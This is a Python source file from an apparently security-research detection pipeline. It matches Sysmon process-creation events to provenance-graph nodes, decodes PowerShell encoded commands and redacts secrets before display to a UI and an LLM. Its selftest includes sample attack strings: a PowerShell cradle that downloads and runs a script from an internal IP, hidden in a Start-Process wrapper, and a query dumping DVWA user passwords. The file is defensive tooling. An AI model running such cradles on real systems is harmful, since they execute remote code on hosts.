#!/usr/bin/env python3
"""[OURS] Process command lines for the UI and the LLM document, joined from Sysmon Event ID 1 (DEVIATIONS D14).

Why a separate source: our ETW Kernel-Process ProcessStart event has no CommandLine field (only ProcessID,
ParentProcessID, SessionID, Flags, ImageName). Sysmon (Ansible role win_sysmon, EID 1 only) records it when the
process is created, and etwcollect ships it as provider `sysmon` next to kproc/kfile/knet.

Why investigation-only: [PAPER] §5.1.1 keeps attributes such as command lines OUT of the OCRGCN input (spurious
correlations) and "retained for the investigation phase". So nothing here touches edges, features or scores.
Like lab_filters.py, this runs AFTER conversion and lives outside the converter sha256 (etw2nodlink.py).

The join (one PROCESS node -> one Sysmon record):
    node id  p<pid>_<t>        (converter: t = epoch ms of the Kernel-Process ProcessStart; a window prefix
                                 `w0007_` is stripped). `p<pid>_pre_<run>` (started before capture) never matches.
    record   (ProcessId, UtcTime)  from a Sysmon EID 1 line.
    match    same PID, and the record with the latest start <= t + tol (tol 2 s): the process that owned that PID
             at time t. Both sources stamp the same creation moment, so a ProcessStart node lands within a few ms.

Display copy (what leaves the host for the UI and the LLM):
    1. PowerShell -enc/-EncodedCommand payloads are decoded (base64 -> UTF-16LE) into `decoded`.
    2. Best-effort secret redaction (-Password x, password=x, /pass:x, ConvertTo-SecureString "x") -> `<redacted>`.
    3. Each field is cut to MAX_CHARS.

Usage:
    python cmdlines.py --selftest
    python cmdlines.py --sysmon <raw>/sysmon.json --node-attrs <window>/node_attrs.csv --out node_cmdlines.csv
"""
import argparse
import base64
import bisect
import csv
import json
import os
import re
import sys
import tempfile
from datetime import datetime, timezone

SYSMON_STREAM = "sysmon"           # etwcollect stem = Loki `provider` label = live engine stream name
TOL_MS = 2000                      # Sysmon UtcTime vs Kernel-Process ProcessStart time
MAX_CHARS = 400                    # per displayed field
MAX_PIDS = 200_000                 # bound on the live index (PIDs), oldest dropped first
CSV_COLUMNS = ["node", "pid", "start_utc", "image", "cmdline", "decoded", "parent_cmdline", "delta_ms"]

_NODE = re.compile(r"^(?:w\d+_)?p(\d+)_(\d+)$")
# -e/-ec/-enc.../-EncodedCommand <b64>, also inside Start-Process -ArgumentList '-nop','-enc','<b64>'
_ENC = re.compile(r"(?i)(?:^|[\s'\",])[-/](?:e|ec|en|enc|enco|encod|encode|encoded|encodedc|encodedco|encodedcom|"
                  r"encodedcomm|encodedcomma|encodedcomman|encodedcommand)['\",\s]+([A-Za-z0-9+/]{8,}={0,2})")
_SECRETS = [
    re.compile(r"(?i)(-{1,2}password[\s=:]+)(\"[^\"]*\"|'[^']*'|[^\s;&|]+)"),
    re.compile(r"(?i)\b((?:password|passwd|pwd)=)([^\s;&|\"']+)"),
    re.compile(r"(?i)(/pass(?:word)?:)([^\s;&|]+)"),
    re.compile(r"(?i)(ConvertTo-SecureString\s+(?:-String\s+)?)(\"[^\"]*\"|'[^']*')"),
]


# --------------------------------------------------------------------------- parse
def utc_ms(s: str) -> int | None:
    """Sysmon UtcTime '2026-11-13 12:21:07.891' (UTC, no zone) -> epoch ms."""
    try:
        dt = datetime.strptime(str(s).strip()[:23], "%Y-%m-%d %H:%M:%S.%f")
    except ValueError:
        return None
    return int(dt.replace(tzinfo=timezone.utc).timestamp() * 1000)


def parse(ev: dict) -> dict | None:
    """One decoded SilkETW-format line (dict) -> record, or None if it is not a Sysmon ProcessCreate.
    Identified by its fields, not its EventName (TDH's task name for EID 1 is a long rule string)."""
    if "sysmon" not in str(ev.get("ProviderName", "")).lower():
        return None
    d = ev.get("XmlEventData") or {}
    if "CommandLine" not in d or "ProcessId" not in d:
        return None
    try:
        pid = int(str(d["ProcessId"]).replace(",", ""))
    except ValueError:
        return None
    t = utc_ms(d.get("UtcTime", ""))
    if t is None:
        return None
    return {"pid": pid, "t": t, "utc": str(d.get("UtcTime", "")), "image": str(d.get("Image", "")),
            "cmdline": str(d.get("CommandLine", "")), "parent_cmdline": str(d.get("ParentCommandLine", ""))}


def parse_line(line) -> dict | None:
    try:
        return parse(json.loads(line))
    except (ValueError, TypeError):
        return None


def node_key(node_id: str) -> tuple[int, int] | None:
    """'w0007_p4321_1762950000123' / 'p4321_1762950000123' -> (4321, 1762950000123); anything else -> None."""
    m = _NODE.match(str(node_id))
    return (int(m.group(1)), int(m.group(2))) if m else None


# --------------------------------------------------------------------------- index
class CmdlineIndex:
    """PID -> records sorted by start time. Live: one per engine session, fed line by line; offline: one file."""

    def __init__(self, tol_ms: int = TOL_MS, max_pids: int = MAX_PIDS):
        self.tol, self.max_pids = tol_ms, max_pids
        self.by_pid: dict[int, list] = {}      # pid -> [(t, rec)] sorted by t; dict order = first-seen order
        self.n = 0

    def add(self, rec: dict | None) -> bool:
        if rec is None:
            return False
        lst = self.by_pid.setdefault(rec["pid"], [])
        if any(t == rec["t"] for t, _ in lst):          # a re-sent line (Loki overlap, replay)
            return False
        bisect.insort(lst, (rec["t"], rec), key=lambda x: x[0])
        self.n += 1
        while len(self.by_pid) > self.max_pids:        # drop the oldest PIDs (insertion order)
            self.n -= len(self.by_pid.pop(next(iter(self.by_pid))))
        return True

    def add_line(self, line) -> bool:
        return self.add(parse_line(line))

    def lookup(self, node_id: str) -> dict | None:
        """The record of the process that owned the node's PID at the node's start time, plus delta_ms."""
        k = node_key(node_id)
        if k is None:
            return None
        pid, t = k
        lst = self.by_pid.get(pid)
        if not lst:
            return None
        i = bisect.bisect_right(lst, t + self.tol, key=lambda x: x[0])
        if i == 0:
            return None
        rt, rec = lst[i - 1]
        return {**rec, "delta_ms": t - rt}

    def __len__(self):
        return self.n


# --------------------------------------------------------------------------- display copy
def decode_powershell(cmd: str) -> str | None:
    """The plain text of a PowerShell -enc payload (UTF-16LE base64), or None."""
    m = _ENC.search(cmd or "")
    if not m:
        return None
    b = m.group(1)
    try:
        s = base64.b64decode(b + "=" * (-len(b) % 4), validate=True).decode("utf-16-le")
    except (ValueError, UnicodeDecodeError):
        return None
    return s if s and sum(c.isprintable() for c in s) >= 0.9 * len(s) else None


def redact(s: str) -> str:
    for rx in _SECRETS:
        s = rx.sub(lambda m: m.group(1) + "<redacted>", s)
    return s


def clip(s: str, n: int = MAX_CHARS) -> str:
    s = " ".join(str(s or "").split())               # one line: newlines/tabs from scripts collapse to spaces
    return s if len(s) <= n else s[:n - 1] + "…"


def display(rec: dict | None) -> dict:
    """Record -> the fields shown in the UI / LLM document ({} when no match)."""
    if not rec:
        return {}
    dec = decode_powershell(rec["cmdline"])
    out = {"cmdline": clip(redact(rec["cmdline"])),
           "parent_cmdline": clip(redact(rec["parent_cmdline"]))}
    if dec:
        out["decoded"] = clip(redact(dec))
    return out


def rows_for(index: CmdlineIndex, node_ids) -> list[dict]:
    """node_cmdlines.csv rows for the PROCESS nodes that matched (display copy, CSV_COLUMNS)."""
    out = []
    for n in node_ids:
        rec = index.lookup(n)
        if rec is None:
            continue
        d = display(rec)
        out.append({"node": n, "pid": rec["pid"], "start_utc": rec["utc"], "image": rec["image"],
                    "cmdline": d["cmdline"], "decoded": d.get("decoded", ""), "parent_cmdline": d["parent_cmdline"],
                    "delta_ms": rec["delta_ms"]})
    return out


def display_fields(row: dict) -> dict:
    """A rows_for() row -> the fields attached to a node in the UI detail / subgraph dicts (empty ones left out)."""
    return {k: row[k] for k in ("cmdline", "decoded", "parent_cmdline") if row.get(k)}


def write_csv(path: str, rows: list[dict]) -> None:
    tmp = path + ".tmp"
    with open(tmp, "w", newline="", encoding="utf-8") as fh:
        w = csv.DictWriter(fh, fieldnames=CSV_COLUMNS)
        w.writeheader()
        w.writerows(rows)
    os.replace(tmp, path)


def load_file(path: str, index: CmdlineIndex | None = None) -> CmdlineIndex:
    index = index or CmdlineIndex()
    with open(path, encoding="utf-8", errors="replace") as fh:
        for line in fh:
            index.add_line(line)
    return index


# --------------------------------------------------------------------------- selftest
def selftest() -> int:
    def sm(pid, utc, cmd, parent="C:\\Windows\\system32\\cmd.exe"):
        return json.dumps({"ProviderName": "Microsoft-Windows-Sysmon", "EventName": "ProcessCreate(rule:ProcessCreate)",
                           "XmlEventData": {"ProcessId": str(pid), "UtcTime": utc, "Image": "C:\\x.exe",
                                            "CommandLine": cmd, "ParentCommandLine": parent}})
    t0 = utc_ms("2026-11-13 12:21:07.891")
    assert t0 == 1794572467891, t0
    ix = CmdlineIndex()
    assert ix.add_line(sm(1060, "2026-11-13 12:21:07.913", "whoami  /all"))
    assert not ix.add_line(sm(1060, "2026-11-13 12:21:07.913", "whoami  /all")), "re-sent line counted once"
    ix.add_line(sm(1060, "2026-11-13 12:30:00.000", "notepad.exe"))          # PID reused 9 min later
    assert not ix.add_line('{"ProviderName":"Microsoft-Windows-Kernel-Process","XmlEventData":{"ProcessID":"1"}}')
    assert not ix.add_line("not json")
    assert len(ix) == 2
    # ProcessStart node 4 ms after Sysmon's time, with and without a window prefix
    for nid in (f"p1060_{t0 + 22 + 4}", f"w0007_p1060_{t0 + 22 + 4}"):
        r = ix.lookup(nid)
        assert r and r["cmdline"] == "whoami  /all" and r["delta_ms"] == 4, (nid, r)
    assert ix.lookup(f"p1060_{utc_ms('2026-11-13 12:30:00.003')}")["cmdline"] == "notepad.exe", "reused PID -> newer"
    assert ix.lookup(f"p1060_{t0 - 60_000}") is None, "process older than every record"
    assert ix.lookup("p1060_pre_live-1") is None and ix.lookup("f0123abcd") is None and ix.lookup("p999_1") is None
    # -enc decode (the RCE cradle shape) + one-line clip
    inner = "iex ((iwr http://10.21.4.30:8080/s.ps1 -UseBasicParsing).Content)"
    enc = base64.b64encode(inner.encode("utf-16-le")).decode()
    d = display({"pid": 1, "t": 0, "utc": "", "image": "", "cmdline": f"powershell -nop -enc {enc}", "parent_cmdline": ""})
    assert d["decoded"] == inner, d
    assert decode_powershell("powershell -EncodedCommand " + enc) == inner
    outer = f"powershell -w hidden -nop -c \"Start-Process powershell -WindowStyle Hidden -ArgumentList '-nop','-enc','{enc}'\""
    assert decode_powershell(outer) == inner, "Start-Process -ArgumentList form (the DVWA cradle)"
    assert decode_powershell("powershell -ExecutionPolicy Bypass -File x.ps1") is None
    assert decode_powershell("cmd /e ABCDEFGHIJ") is None, "not UTF-16LE text"
    # redaction keeps SQL column names, removes secret values
    assert redact('mysql -uroot -N -e "SELECT user,password FROM dvwa.users;"') == \
        'mysql -uroot -N -e "SELECT user,password FROM dvwa.users;"'
    assert redact("New-LocalUser x -Password 'S3cret!'") == "New-LocalUser x -Password <redacted>"
    assert redact("app --password=hunter2 --x") == "app --password=<redacted> --x"
    assert redact("cmdkey /add:h /user:u /pass:Pa55") == "cmdkey /add:h /user:u /pass:<redacted>"
    assert redact("Server=x;pwd=abc;") == "Server=x;pwd=<redacted>;"
    assert redact('ConvertTo-SecureString "Pw1" -AsPlainText') == "ConvertTo-SecureString <redacted> -AsPlainText"
    long = display({"pid": 1, "t": 0, "utc": "", "image": "", "cmdline": "a\n" * 500, "parent_cmdline": ""})
    assert len(long["cmdline"]) == MAX_CHARS and "\n" not in long["cmdline"]
    # bound: oldest PID dropped
    small = CmdlineIndex(max_pids=2)
    for i, pid in enumerate((1, 2, 3)):
        small.add_line(sm(pid, f"2026-11-13 12:00:0{i}.000", "x"))
    assert set(small.by_pid) == {2, 3} and len(small) == 2
    # file round trip -> CSV
    with tempfile.TemporaryDirectory() as tmp:
        p = os.path.join(tmp, "sysmon.json")
        with open(p, "w", encoding="utf-8") as fh:
            fh.write(sm(1060, "2026-11-13 12:21:07.913", "whoami  /all") + "\n")
        rows = rows_for(load_file(p), [f"w0001_p1060_{t0 + 22}", "f1", "p5_pre_r"])
        assert [r["cmdline"] for r in rows] == ["whoami /all"], rows
        write_csv(os.path.join(tmp, "out.csv"), rows)
        with open(os.path.join(tmp, "out.csv"), encoding="utf-8") as fh:
            got = list(csv.DictReader(fh))
        assert got[0]["node"] == f"w0001_p1060_{t0 + 22}" and got[0]["delta_ms"] == "0"
    print("[SELFTEST OK] cmdlines: parse, PID+time join (window prefix, PID reuse, pre-capture), -enc decode, "
          "redaction, clip, bound, CSV")
    return 0


def main():
    ap = argparse.ArgumentParser(description=__doc__.split("\n")[0])
    ap.add_argument("--selftest", action="store_true")
    ap.add_argument("--sysmon", help="raw sysmon.json (SilkETW-format lines)")
    ap.add_argument("--node-attrs", help="node_attrs.csv (node,node_type,node_attr) of one window")
    ap.add_argument("--out", help="node_cmdlines.csv to write")
    a = ap.parse_args()
    if a.selftest:
        return selftest()
    if not (a.sysmon and a.node_attrs and a.out):
        ap.error("--sysmon, --node-attrs and --out are required (or --selftest)")
    ix = load_file(a.sysmon)
    with open(a.node_attrs, newline="", encoding="utf-8") as fh:
        nodes = [r["node"] for r in csv.DictReader(fh) if r.get("node_type", "").upper() == "PROCESS"]
    rows = rows_for(ix, nodes)
    write_csv(a.out, rows)
    print(f"[cmdlines] {len(ix)} Sysmon records, {len(rows)}/{len(nodes)} PROCESS nodes matched -> {a.out}")
    return 0


if __name__ == "__main__":
    sys.exit(main())
